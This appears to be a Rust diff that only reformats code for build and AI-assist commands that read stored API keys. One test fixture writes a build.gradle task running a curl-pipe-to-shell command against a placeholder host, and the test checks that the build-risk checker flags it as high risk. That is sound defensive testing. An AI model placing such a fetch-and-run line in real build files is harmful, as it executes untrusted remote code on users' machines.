@@ -181,7 +181,10 @@ pub fn start_build(
     } else {
         store
             .get("github_token")
-            .map_err(|message| UiError { kind: "internal", message })?
+            .map_err(|message| UiError {
+                kind: "internal",
+                message,
+            })?
             .map(Secret::new)
     };
     Ok(svc.start_build_with_token(request, token)?)
@@ -197,17 +200,27 @@ pub fn start_ai_assist(
     store: &dyn SecretStore,
     request: PlanRequest,
 ) -> Result<Uuid, UiError> {
-    let provider_name = svc.settings().ai_provider.unwrap_or_else(|| "anthropic".into());
+    let provider_name = svc
+        .settings()
+        .ai_provider
+        .unwrap_or_else(|| "anthropic".into());
     let provider: Arc<dyn AiProvider> = match provider_name.as_str() {
         "anthropic" => {
             let key = store
                 .get("anthropic_api_key")
-                .map_err(|message| UiError { kind: "internal", message })?
+                .map_err(|message| UiError {
+                    kind: "internal",
+                    message,
+                })?
                 .ok_or_else(|| UiError {
                     kind: "refused",
-                    message: "Save an Anthropic API key in Settings before starting AI assist.".into(),
+                    message: "Save an Anthropic API key in Settings before starting AI assist."
+                        .into(),
                 })?;
-            Arc::new(AnthropicProvider::with_api_key(key, "https://api.anthropic.com"))
+            Arc::new(AnthropicProvider::with_api_key(
+                key,
+                "https://api.anthropic.com",
+            ))
         }
         "openai" => {
             let key = store
@@ -346,7 +359,10 @@ mod tests {
             high.join("build.gradle"),
             "plugins { id 'java' }\ntask setup(type: Exec) { commandLine 'sh', '-c', 'curl https://example.invalid/x.sh | sh' }",
         ).unwrap();
-        assert_eq!(check_build_risk(&svc, &high, true).unwrap(), Some(RiskLevel::High));
+        assert_eq!(
+            check_build_risk(&svc, &high, true).unwrap(),
+            Some(RiskLevel::High)
+        );
     }
 
     #[test]
@@ -372,7 +388,10 @@ mod tests {
         };
         assert_eq!(job_output_path(&bad).unwrap_err().kind, "input");
 
-        let missing = JobView { result: None, ..job };
+        let missing = JobView {
+            result: None,
+            ..job
+        };
         assert_eq!(job_output_path(&missing).unwrap_err().kind, "not_found");
     }
 
